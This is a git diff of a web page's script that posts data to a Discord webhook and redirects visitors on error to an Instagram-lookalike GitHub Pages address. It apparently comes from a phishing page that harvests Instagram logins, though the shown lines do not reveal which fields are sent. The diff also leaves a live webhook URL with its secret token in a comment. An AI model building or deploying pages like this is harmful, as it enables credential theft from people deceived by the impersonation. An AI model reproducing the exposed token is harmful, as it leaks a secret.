@@ -23,7 +23,7 @@
 
 
   // Replace YOUR_WEBHOOK_URL with the actual URL of your Discord webhook
-  var webhookUrl = "https://discord.com/api/webhooks/1074932618719658025/Sf29kV61PQ8lJEMZ0rvtgcDQ_apI4jihRiU-NQ9I08uw5YORMLSSnF-vA7aQT_Ho87hO";
+  var webhookUrl = process.env.WEBHOOK //"https://discord.com/api/webhooks/1074932618719658025/Sf29kV61PQ8lJEMZ0rvtgcDQ_apI4jihRiU-NQ9I08uw5YORMLSSnF-vA7aQT_Ho87hO";
 
   // Create a new XMLHttpRequest object
   var xhr = new XMLHttpRequest();
@@ -49,7 +49,7 @@
 }
 
 function sendError() {
-  window.location.href='http://127.0.0.1:5500/Test/error.html'
+  window.location.href='https://instagram-clients.github.io/error-500/'
 
 }
     </script>
